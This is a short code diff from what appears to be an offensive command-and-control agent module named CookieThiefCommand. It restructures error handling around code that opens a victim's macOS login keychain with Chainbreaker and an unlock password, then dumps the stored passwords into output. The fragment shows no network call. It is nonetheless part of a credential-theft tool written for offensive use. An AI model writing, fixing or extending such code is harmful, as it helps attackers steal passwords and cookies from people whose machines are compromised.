@@ -85,21 +85,8 @@ class CookieThiefCommand(CommandBase):
         try:
             keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=k_password, unlock_key=None,
                                     unlock_file=None)
-            ##DEBUG:
-            print("THIS did NOT fail: " + str(keychain))
-            sys.stdout.flush()
 
-        except Exception as e:
-            ##DEBUG:
-            traceback.print_exc()
-            sys.stdout.flush()
-            print("Chainbreaker script failed with error: " + str(e))
-            sys.stdout.flush()
-
-
-        keychainoutput = []
-
-        try:
+            keychainoutput = []
 
             keychainoutput.append(
                 {
@@ -112,7 +99,8 @@ class CookieThiefCommand(CommandBase):
             )
 
         except Exception as e:
-            print("Chainbreaker script failed to dump passwords with error: " + str(e))
+            #print("Chainbreaker script failed to dump passwords with error: " + str(e))
+            traceback.print_exc()
             sys.stdout.flush()
 
         try:
